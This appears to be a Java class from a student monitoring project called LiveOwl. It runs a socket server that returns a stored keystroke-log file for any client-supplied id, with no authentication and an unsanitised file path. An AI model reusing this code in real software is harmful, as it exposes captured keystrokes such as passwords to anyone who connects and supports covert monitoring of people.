package com.server.liveowl.Keylogger;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;

public class SendFile implements Runnable {

private final int port;
private final String basePath;

public SendFile(int port, String basePath) {
    this.port = port;
    this.basePath = basePath;
}

@Override
public void run() {
    try (ServerSocket server = new ServerSocket(port)) {
        System.out.println("Server đã sẵn sàng lắng nghe");
        while (true) {
            try (Socket soc = server.accept();
                 DataInputStream dis = new DataInputStream(soc.getInputStream());
                 DataOutputStream dos = new DataOutputStream(soc.getOutputStream())) {
                String id = dis.readUTF();
                String filePath = basePath + id + "_keylogs.txt";
                try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(new FileInputStream(filePath)))) {
                    String line;
                    while ((line = bufferedReader.readLine()) != null) {
                        dos.writeUTF(line);
                    }
                    dos.writeUTF("EOF");
                }
            } catch (Exception e) {
                System.out.println("Lỗi: " + e.getMessage());
            }
        }
    } catch (Exception e) {
        System.out.println("Lỗi khi khởi tạo server: " + e.getMessage());
    }
}

//public static void main(String[] args) {
//    Thread serverThread = new Thread(new SendFile(8888, "D:/PBL4/LiveOwlServer/src/main/java/com/server/liveowl/Keylogger/"));
//    serverThread.start();
//}
}